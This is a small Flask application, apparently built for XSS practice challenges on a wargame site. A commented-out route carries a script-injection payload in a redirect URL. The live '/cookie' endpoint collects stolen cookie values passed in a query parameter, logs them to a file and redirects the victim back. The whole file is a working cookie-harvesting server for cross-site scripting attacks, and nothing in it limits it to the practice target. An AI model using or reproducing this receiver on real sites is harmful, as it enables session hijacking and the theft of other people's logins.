from flask import Flask, render_template, redirect, request
import os


app = Flask(__name__)

# @app.route('/')
# def xss():
#     return redirect('http://challenges.enigmagroup.org/basics/xss/1/index.php?search=<script>alert("test");</script>')

# @app.route('/')
# def hack():
#     return render_template('vuln.php')


@app.route('/cookie')
def xss_2():
    cookie = request.args.get('c')
    with open('log.txt', 'w') as f:
        f.write(cookie)
    return redirect('http://challenges.enigmagroup.org/basics/xss/2/')


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
